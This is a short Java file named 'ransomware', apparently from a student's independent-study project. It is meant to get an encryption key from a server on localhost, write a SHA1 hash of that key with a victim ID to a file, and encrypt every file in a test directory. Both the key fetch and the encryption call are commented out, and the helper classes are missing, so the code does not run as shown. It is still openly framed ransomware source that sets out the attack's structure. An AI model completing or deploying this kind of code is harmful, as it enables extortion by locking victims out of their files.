import java.io.*;
import java.util.*;
import java.security.*;
import javax.crypto.*;
import java.net.*;

public class ransomware
{
    public static void main(String[] args) throws IOException, NoSuchAlgorithmException
    {
        //Path to directorys
        String directoryPath = "C:/Users/Matt/Desktop/CS Independant study/TestFolder";
        String hashDirectory = "C:/Users/Matt/Desktop/CS Independant study/ransomHash.txt";
        
      
        //-------------------------obtain KEY-------------------------------------
        String keyString = null;
        int serverPort = 49019;
        String host = "localhost";
        Socket clientSocket = null;
        
//         try {
//             BufferedReader inFromUser = new BufferedReader(new InputStreamReader(System.in));
//             clientSocket = new Socket(host, serverPort);
//             //DataOutputStream outToServer = new DataOutputStream(clientSocket.getOutputStream());
//             BufferedReader inFromServer = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
//             //outToServer.writeBytes(request);
//             keyString = inFromServer.readLine();
//             System.out.println("Key pbtained from server");
//             clientSocket.close();
//         } catch (Exception e) {
//             e.printStackTrace();
//             try {
//                 if (clientSocket != null) {
//                     clientSocket.close();
//                 }
//             } catch (Exception cse) {
//                 // ignore exception here
//             }
//         }
        byte[] key = Arrays.copyOf(keyString.getBytes(),16);

        //Write file with hashed password and ID
        int ID = 3;
        String passwordHash = SHA1.Hash(keyString);
        Encrypt.writeHashFile(hashDirectory, passwordHash, ID);

        //--------Encryption--------------------------------------------------------

        //IterateDirectory.iterateDir(directoryPath, key, Cipher.ENCRYPT_MODE);    
        System.out.println("-----------------------Encryption Done.----------------------");

        //--------Encryption--------------------------------------------------------- 

    }

}
